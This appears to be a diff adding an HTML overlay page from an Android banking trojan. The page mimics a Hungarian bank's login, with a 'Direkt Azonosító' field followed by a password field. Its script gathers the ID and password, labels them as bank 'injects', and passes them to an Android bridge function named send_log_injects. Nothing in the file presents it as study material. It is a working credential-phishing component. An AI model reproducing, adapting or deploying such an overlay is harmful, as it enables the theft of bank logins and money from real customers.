@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+            border-bottom: 2px solid #58bca1;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+        
+        footer {
+            padding: 15px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 8px;
+            border: 0;
+            border-bottom: 1px solid #767884;
+            margin-bottom: 20px;
+        }
+
+        .input:focus {
+            border-color: #436ab9;
+        }
+
+        label {
+            margin: 0;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            border: 0;
+            border-radius: 25px;
+            background-color: #436ab9;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .button:disabled {
+            opacity: 0.4;
+        }
+
+        .input:disabled {
+            background-color: transparent;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <span> BELÉPÉS </span>
+        </header>
+        <section>
+            <p style="text-align: left;font-size: 14px;" id="text"> Kérjük, adja meg a 8 számjegyű Direkt Azonosítóját, majd kattintson a TOVÁBB gombra. </p>
+            <label for="login"> Direkt Azonosító </label>
+            <input type="tel" class="input" id="login" name="login" placeholder="" maxlength="8" autocomplete="off">
+
+            <div id="passBlock" style="display: none;">
+                <label for="password"> Jelszó </label>
+                <input type="password" class="input" id="password" name="password" placeholder="" autocomplete="off">     
+            </div>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="nextPage" disabled value="Tovább">
+            <input type="submit" class="button" id="sendData" style="display: none;" disabled value="KÓD KÉRÉSE">
+        </footer>
+    </form>
+    <script>
+        $('#login').mask('00000000');
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData');
+
+        var passBlock = document.getElementById('passBlock'),
+            text = document.getElementById('text');
+
+        function check() {
+            if(login.value.length === 8) {
+                nextPage.disabled = false;
+            } else {
+                nextPage.disabled = true;
+            }
+        }
+
+        function check2() {
+            if(password.value.length >= 4) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        login.onkeyup = () => {
+            check();
+        }
+
+        password.onkeyup = () => {
+            check2();
+        }
+        
+        nextPage.onclick = () => {
+            login.disabled = true;
+            passBlock.style.display = 'block';
+            password.focus();
+            nextPage.style.display = 'none';
+            sendData.style.display = 'block';
+            text.style.display = 'none';
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+            data.login = login.value;
+            data.password = password.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+    </script>
+</body>
+</html>
